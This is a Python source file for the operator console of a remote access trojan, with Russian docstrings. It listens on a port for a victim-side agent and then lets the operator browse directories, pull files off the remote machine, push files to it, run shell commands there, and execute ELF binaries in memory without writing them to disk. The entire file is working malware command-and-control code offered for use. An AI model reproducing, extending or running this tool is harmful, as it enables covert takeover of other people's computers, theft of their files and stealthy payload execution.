from enum import Enum
from sys import argv
from cmd import Cmd
import socket, os


class Command(Enum):
    TERMINATE = 0
    LS = 1
    CD = 2
    DOWNLOAD = 3
    UPLOAD = 4
    SH = 5
    EXECUTE = 6


class RAT(Cmd):
    s = None

    def accept(self):
        if len(argv) != 2:
            print('Usage: {} PORT'.format(argv[0]))
            exit(1)
        port = int(argv[1])

        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('', port))
        s.listen()
        print('[*] Listening')
        conn, addr = s.accept()
        print('[+] Connection from:', addr[0])
        s.close()

        self.s = conn
        self.prompt = '({})> '.format(addr[0])

    def _send_command(self, command):
        self.s.send(bytes([command.value]))

    def _receive_plaintext(self):
        while True:
            data = self.s.recv(1024)
            if data[-1] == 0x4:  # end of transmission
                return
            print(data.decode(), end='')

    def do_terminate(self, _):
        """Закрыть агента на удаленной машине"""
        self._send_command(Command.TERMINATE)
        return True

    def do_ls(self, _):
        """Показать содержимое текущей директории удаленной машине"""
        self._send_command(Command.LS)
        while True:
            length = self.s.recv(1)[0]
            if not length:
                break
            name = self.s.recv(length, socket.MSG_WAITALL).decode()
            print(name, end=' ')
        print()

    def do_cd(self, args):
        """Сменить текущий путь на удаленной машине"""
        path = args.split()[0]
        self._send_command(Command.CD)
        self.s.send(bytes([len(path)]) + path.encode())

    def do_download(self, args):
        """Скачать файл с удаленной машины"""
        filename = args.split()[0]
        self._send_command(Command.DOWNLOAD)
        self.s.send(bytes([len(filename)]) + filename.encode())

        file_size = int.from_bytes(self.s.recv(8), 'little')
        if not file_size:
            print('[-] Download error')
        print('[*] File size:', file_size)
        file = open(filename, 'wb')
        file.write(self.s.recv(file_size, socket.MSG_WAITALL))
        file.close()
        print('[+] Download done')

    def do_upload(self, args):
        """Выкачать файл на удаленную машину"""
        filename = args.split()[0]
        self.s.send(bytes([len(filename)]) + filename.encode())

        result = self.s.recv(1)[0]
        if not result:
            print('[-] Upload error')

        size = os.path.getsize(filename)
        print('[*] File size:', size)
        self._send_command(Command.UPLOAD)
        self.s.send(size.to_bytes(8, 'little'))

        file = open(filename, 'rb')
        self.s.sendfile(file)
        file.close()
        print('[+] Upload done')

    def do_sh(self, command):
        """Выполнить команду на удаленной машине"""
        self._send_command(Command.SH)
        self.s.send(len(command).to_bytes(1, 'little') + command.encode())
        self._receive_plaintext()

    def do_execute(self, args):
        """Выполнить локальный ELF файл на удаленной машине без записи его на диск"""
        filename = args.split()[0]
        size = os.path.getsize(filename)
        print('[*] ELF size:', size)

        self._send_command(Command.EXECUTE)
        self.s.send(size.to_bytes(8, 'little'))

        file = open(filename, 'rb')
        self.s.sendfile(file)
        file.close()
        print('[+] Done')

        self._receive_plaintext()


if __name__ == '__main__':
    rat = RAT()
    rat.accept()
    try:
        rat.cmdloop()
    except KeyboardInterrupt:
        rat.s.close()
